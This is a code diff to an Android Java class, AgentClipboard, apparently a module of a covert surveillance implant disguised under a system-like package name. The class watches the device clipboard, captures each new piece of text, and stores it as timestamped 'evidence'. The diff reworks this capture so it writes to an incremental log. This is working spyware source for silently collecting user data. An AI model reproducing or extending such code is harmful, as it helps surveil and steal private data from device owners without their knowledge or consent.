@@ -19,16 +19,34 @@ import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
+import com.android.service.interfaces.IncrementalLog;
 import com.android.service.util.Check;
 import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
-public class AgentClipboard extends AgentBase {
+public class AgentClipboard extends AgentBase implements IncrementalLog {
 	private static final String TAG = "AgentClipboard";
 
 	ClipboardManager clipboardManager;
 	static String lastClip = "";
+	
+	LogR logIncremental;
+
+	@Override
+	public void begin() {
+		logIncremental = new LogR(EvidenceType.CLIPBOARD);
+		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
+		if (Cfg.DEBUG) {
+			Check.ensures(clipboardManager != null, "Null clipboard manager");
+		}
+	}
+
+	@Override
+	public void end() {
+		clipboardManager = null;
+		logIncremental.close();
+	}
 
 	@Override
 	public boolean parse(AgentConf conf) {
@@ -39,43 +57,42 @@ public class AgentClipboard extends AgentBase {
 	@Override
 	public void go() {
 
-		String ret = clipboardManager.getText().toString();
+		final String ret = clipboardManager.getText().toString();
 		if (ret != null && !ret.equals(lastClip)) {
-			if(Cfg.DEBUG) Check.log( TAG + " (go): captured " + ret);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go): captured " + ret);
+			}
 			saveEvidence(ret);
 			lastClip = ret;
 		}
 	}
 
 	private void saveEvidence(String ret) {
-		
+
 		final byte[] tm = (new DateTime()).getStructTm();
-		byte[] payload = WChar.getBytes(ret.toString(), true);
-		byte[] process = WChar.getBytes("", true);
-		byte[] window = WChar.getBytes("", true);
-		
+		final byte[] payload = WChar.getBytes(ret.toString(), true);
+		final byte[] process = WChar.getBytes("", true);
+		final byte[] window = WChar.getBytes("", true);
+
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
-		items.add(tm);		
+		items.add(tm);
 		items.add(process);
 		items.add(window);
 		items.add(payload);
 		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
 
-		LogR log = new LogR(EvidenceType.CLIPBOARD);
-		log.write(items);
-		log.close();
+		if (Cfg.DEBUG) {
+			Check.asserts(logIncremental != null, "null log");
+		}
+		logIncremental.write(items);
 
 	}
 
-	@Override
-	public void begin() {
-		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
-		if(Cfg.DEBUG) Check.ensures(clipboardManager != null, "Null clipboard manager");
-	}
-
-	@Override
-	public void end() {
-		clipboardManager = null;
+	public void resetLog() {
+		if(logIncremental.hasData()){
+			logIncremental.close();
+			logIncremental = new LogR(EvidenceType.CLIPBOARD);
+		}
 	}
 
 }
